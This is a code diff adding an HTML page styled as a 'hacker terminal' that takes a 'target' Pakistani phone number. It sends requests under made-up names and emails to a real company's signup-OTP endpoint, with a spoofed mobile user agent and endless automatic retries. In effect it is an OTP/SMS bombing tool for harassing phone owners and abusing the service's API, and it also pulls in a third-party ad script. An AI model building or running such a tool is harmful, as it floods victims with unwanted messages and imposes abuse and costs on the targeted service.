@@ -1,0 +1,409 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DANGER 786 TEAM OTP Terminal</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+<style>
+  /* Cyberpunk theme styles */
+  body {
+    background-color: #000;
+    color: #0f0;
+    font-family: 'Courier New', monospace;
+    overflow-x: hidden;
+  }
+  
+  .terminal {
+    background-color: rgba(0, 0, 0, 0.8);
+    border: 1px solid #0f0;
+    box-shadow: 0 0 15px #0f0, 
+                0 0 30px rgba(0, 255, 0, 0.3),
+                inset 0 0 10px rgba(0, 255, 0, 0.5);
+    position: relative;
+    overflow: hidden;
+  }
+  
+  .terminal::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: 
+      radial-gradient(circle at 20% 30%, rgba(0, 255, 0, 0.1) 0%, transparent 50%),
+      radial-gradient(circle at 80% 70%, rgba(255, 0, 0, 0.1) 0%, transparent 50%);
+    pointer-events: none;
+    z-index: 0;
+  }
+  
+  .scanlines {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: repeating-linear-gradient(
+      to bottom,
+      transparent,
+      transparent 2px,
+      rgba(0, 255, 0, 0.05) 2px,
+      rgba(0, 255, 0, 0.05) 4px
+    );
+    pointer-events: none;
+    z-index: 1;
+  }
+  
+  .glitch-effect {
+    text-shadow: 0 0 5px #0f0, 
+                 0 0 10px #0f0,
+                 0 0 15px #0f0;
+    animation: glitch 2s infinite alternate;
+  }
+  
+  @keyframes glitch {
+    0% { transform: translate(0); }
+    20% { transform: translate(-2px, 2px); }
+    40% { transform: translate(-2px, -2px); }
+    60% { transform: translate(2px, 2px); }
+    80% { transform: translate(2px, -2px); }
+    100% { transform: translate(0); }
+  }
+  
+  .smoke {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path fill="rgba(0,255,0,0.03)" d="M0,0 L100,0 L100,100 L0,100 Z"/></svg>');
+    animation: smoke 15s infinite linear;
+    opacity: 0.3;
+    pointer-events: none;
+    z-index: 0;
+  }
+  
+  @keyframes smoke {
+    0% { background-position: 0 0; }
+    100% { background-position: 100% 100%; }
+  }
+  
+  .blink {
+    animation: blink 1s step-end infinite;
+  }
+  
+  @keyframes blink {
+    from, to { opacity: 1; }
+    50% { opacity: 0; }
+  }
+  
+  .matrix-rain {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path fill="rgba(0,255,0,0.02)" d="M0,0 L100,0 L100,100 L0,100 Z"/></svg>');
+    pointer-events: none;
+    z-index: 0;
+  }
+  
+  .btn-hack {
+    background: linear-gradient(to bottom, #0a0, #030);
+    border: 1px solid #0f0;
+    color: #0f0;
+    text-shadow: 0 0 5px #0f0;
+    box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+    transition: all 0.3s;
+  }
+  
+  .btn-hack:hover {
+    background: linear-gradient(to bottom, #0d0, #050);
+    box-shadow: 0 0 15px rgba(0, 255, 0, 0.8);
+    transform: translateY(-2px);
+  }
+  
+  .btn-hack:active {
+    background: linear-gradient(to bottom, #070, #020);
+    box-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
+    transform: translateY(1px);
+  }
+  
+  .input-hack {
+    background: rgba(0, 20, 0, 0.5);
+    border: 1px solid #0a0;
+    color: #0f0;
+    caret-color: #0f0;
+  }
+  
+  .input-hack:focus {
+    outline: none;
+    border-color: #0f0;
+    box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+  }
+  
+  .response-area {
+    background: rgba(0, 10, 0, 0.3);
+    border: 1px solid #0a0;
+    font-family: 'Courier New', monospace;
+    position: relative;
+  }
+  
+  .response-area::before {
+    content: ">";
+    position: absolute;
+    left: 10px;
+    top: 10px;
+    color: #0f0;
+  }
+  
+  .typewriter {
+    overflow: hidden;
+    border-right: 2px solid #0f0;
+    white-space: nowrap;
+    margin: 0 auto;
+    letter-spacing: 2px;
+    animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
+  }
+  
+  @keyframes typing {
+    from { width: 0 }
+    to { width: 100% }
+  }
+  
+  @keyframes blink-caret {
+    from, to { border-color: transparent }
+    50% { border-color: #0f0; }
+  }
+</style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4 bg-black">
+  <!-- Matrix rain effect container -->
+  <div id="matrixRain" class="matrix-rain"></div>
+  
+  <!-- Smoke effect -->
+  <div class="smoke"></div>
+  
+  <!-- Main terminal container -->
+  <div id="app" class="w-full max-w-2xl terminal rounded-lg shadow-2xl p-6 relative">
+    <!-- Scanlines overlay -->
+    <div class="scanlines"></div>
+    
+    <!-- Header with glitch effect -->
+    <h1 class="text-3xl font-bold text-green-500 mb-6 text-center glitch-effect">
+      <i class="fas fa-terminal mr-2"></i> DANGER 786 TEAM OTP TERMINAL
+    </h1>
+    
+    <!-- Form section -->
+    <form id="signupForm" class="flex flex-col space-y-4 relative z-10">
+      <label for="phone" class="text-green-400 font-semibold">
+        <span class="text-red-500">></span> ENTER TARGET PHONE IN DANGER 786 TEAM [PK FORMAT]:BY AS HACKER
+      </label>
+      <input
+        type="tel"
+        id="phone"
+        name="phone"
+        required
+        pattern="0[0-9]{10}"
+        placeholder="03342677432"
+        class="px-3 py-2 rounded input-hack focus:outline-none"
+      />
+      <button
+        type="submit"
+        class="btn-hack font-semibold py-3 rounded-md flex items-center justify-center relative overflow-hidden"
+      >
+        <span class="relative z-10">
+          <i class="fas fa-bolt mr-2"></i> INITIATE REQUEST
+        </span>
+        <span class="absolute inset-0 bg-green-500 opacity-0 hover:opacity-10 transition-opacity"></span>
+      </button>
+    </form>
+
+    <!-- Response area -->
+    <div id="responseArea" class="mt-6 text-sm font-mono whitespace-pre-wrap text-green-400 min-h-[200px] p-4 response-area relative overflow-auto max-h-80">
+      <div class="typewriter">AS HACKER SYSTEM READY... AWAITING INPUT</div>
+    </div>
+
+    <!-- Animated footer -->
+    <div id="animatedThanks" class="mt-8 text-center text-lg font-semibold h-24 relative z-10">
+      <div class="text-green-500 border-t border-green-900 pt-4">
+        <p class="text-sm blink">_</p>
+        <p class="text-xs text-red-400">DEVELOPED BY: <span class="text-yellow-400">@AS HACKER CODER 9</span></p>
+      </div>
+    </div>
+  </div>
+
+<script>
+  // Enhanced terminal typing effect
+  function typeWriter(element, text, speed = 50, callback) {
+    let i = 0;
+    element.innerHTML = '';
+    function typing() {
+      if (i < text.length) {
+        element.innerHTML += text.charAt(i);
+        i++;
+        setTimeout(typing, speed);
+      } else if (callback) {
+        callback();
+      }
+    }
+    typing();
+  }
+
+  // Generate random matrix rain characters
+  function generateMatrixRain() {
+    const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
+    const container = document.getElementById('matrixRain');
+    const columns = Math.floor(window.innerWidth / 20);
+    
+    for (let i = 0; i < columns; i++) {
+      const column = document.createElement('div');
+      column.style.position = 'absolute';
+      column.style.top = '0';
+      column.style.left = (i * 20) + 'px';
+      column.style.width = '20px';
+      column.style.height = '100%';
+      column.style.color = '#0f0';
+      column.style.opacity = Math.random() * 0.3 + 0.1;
+      column.style.fontSize = (Math.random() * 10 + 10) + 'px';
+      column.style.fontFamily = 'monospace';
+      column.style.whiteSpace = 'nowrap';
+      column.style.overflow = 'hidden';
+      container.appendChild(column);
+      
+      animateColumn(column);
+    }
+    
+    function animateColumn(column) {
+      const speed = Math.random() * 50 + 50;
+      const delay = Math.random() * 3000;
+      const charsCount = Math.floor(Math.random() * 10) + 5;
+      
+      setTimeout(() => {
+        let position = -100;
+        const charsArray = [];
+        
+        for (let i = 0; i < charsCount; i++) {
+          charsArray.push(chars.charAt(Math.floor(Math.random() * chars.length)));
+        }
+        
+        function move() {
+          position += 1;
+          let content = '';
+          for (let i = 0; i < charsArray.length; i++) {
+            const y = position + (i * 20);
+            if (y > window.innerHeight) continue;
+            const opacity = 1 - (i / charsArray.length);
+            content += `<span style="position: absolute; top: ${y}px; left: 0; opacity: ${opacity}">${charsArray[i]}</span>`;
+          }
+          column.innerHTML = content;
+          
+          if (position < window.innerHeight + 100) {
+            requestAnimationFrame(move);
+          } else {
+            setTimeout(() => animateColumn(column), Math.random() * 5000);
+          }
+        }
+        
+        move();
+      }, delay);
+    }
+  }
+
+  // Generate random email address
+  function generateRandomEmail() {
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < 10; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result + '@' + ['gmail.com', 'yahoo.com', 'hotmail.com', 'protonmail.com'][Math.floor(Math.random() * 4)];
+  }
+
+  // Generate random name
+  function generateRandomName() {
+    const firstNames = ['AS HACKER', 'Saad Ahmed', 'Devil Malik', 'Bilal', 'Kamran', 'Farhan', 'Zubair', 'Noman', 'Saad', 'Waqas'];
+    const lastNames = ['Khan', 'Malik', 'Ahmed', 'Shah', 'Butt', 'Chaudhry', 'Sheikh', 'Raza', 'Hussain', 'Abbasi'];
+    return firstNames[Math.floor(Math.random() * firstNames.length)] + ' ' + lastNames[Math.floor(Math.random() * lastNames.length)];
+  }
+
+  const form = document.getElementById('signupForm');
+  const responseArea = document.getElementById('responseArea');
+
+  // Initialize matrix rain
+  generateMatrixRain();
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const phone = form.phone.value.trim();
+    if (!/^0\d{10}$/.test(phone)) {
+      typeWriter(responseArea, 'ERROR: INVALID PHONE FORMAT\nPLEASE ENTER 11 DIGITS STARTING WITH 0\nEXAMPLE: 03342677432', 20);
+      return;
+    }
+
+    const randomEmail = generateRandomEmail();
+    const randomName = generateRandomName();
+
+    const apiUrl = 'https://martbackend.herokuapp.com/user/signUpOtp';
+
+    const jsonBody = {
+      phone: phone,
+      email: randomEmail,
+      name: randomName,
+      referralCode: ''
+    };
+
+    typeWriter(responseArea, 'INITIATING REQUEST...\nTARGET: ' + phone + '\nGENERATED IDENTITY:\nNAME: ' + randomName + '\nEMAIL: ' + randomEmail + '\n\nAS HACKER CONNECTING TO SERVER...', 10, () => {
+      setTimeout(() => {
+        sendRequest(apiUrl, jsonBody, phone, randomEmail, randomName);
+      }, 1500);
+    });
+  });
+
+  async function sendRequest(url, body, phone, email, name) {
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'accept': 'application/json, text/plain, */*',
+          'Content-Type': 'application/json',
+          'Host': 'martbackend.herokuapp.com',
+          'Connection': 'Keep-Alive',
+          'Accept-Encoding': 'gzip',
+          'User-Agent': 'okhttp/4.9.2'
+        },
+        body: JSON.stringify(body)
+      });
+
+      const text = await response.text();
+      
+      let responseText = 
+        `\n\nREQUEST SUCCESSFUL\nSTATUS: ${response.status}\nRESPONSE:\n${text}\n\n` +
+        `==========================================\n` +
+        `TARGET DETAILS:\n` +
+        `PHONE: ${phone}\n` +
+        `EMAIL: ${email}\n` +
+        `NAME: ${name}\n` +
+        `==========================================\n` +
+        `AS HACKER SYSTEM READY FOR NEXT TARGET\n`;
+      
+      typeWriter(responseArea, responseText, 5);
+      
+      // Add glitch effect to the terminal on success
+      document.getElementById('app').classList.add('glitch-effect');
+      setTimeout(() => {
+        document.getElementById('app').classList.remove('glitch-effect');
+      }, 1000);
+      
+    } catch (error) {
+      let errorText = `\n\nERROR: CONNECTION FAILED\n${error.message}\n\nRETRYING...`;
+      typeWriter(responseArea, errorText, 10, () => {
+        setTimeout(() => {
+          sendRequest(url, body, phone, email, name);
+        }, 2000);
+      });
+    }
+  }
+</script>
+<script type='text/javascript' src='//pl26635370.profitableratecpm.com/0d/d6/68/0dd66892ae1350e1c2ac63bd9e54e111.js'></script></body>
+</html>
